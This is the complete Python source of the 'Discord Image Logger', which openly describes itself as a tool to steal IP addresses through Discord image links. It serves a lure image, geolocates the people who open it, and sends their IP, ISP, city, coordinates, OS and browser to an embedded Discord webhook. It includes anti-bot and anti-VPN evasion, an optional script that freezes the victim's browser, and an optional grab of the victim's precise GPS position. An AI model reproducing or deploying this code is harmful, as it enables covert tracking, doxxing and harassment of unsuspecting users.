# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1091448707783856269/VydCsI08afa4N8plhASBN0dPmurraxwd39RpaNwBFjiPcFisYfGCihJFWFXiBWWHCnfz",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "ERROR404", # Message to show
        "richMessage": False, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 3, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": True, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
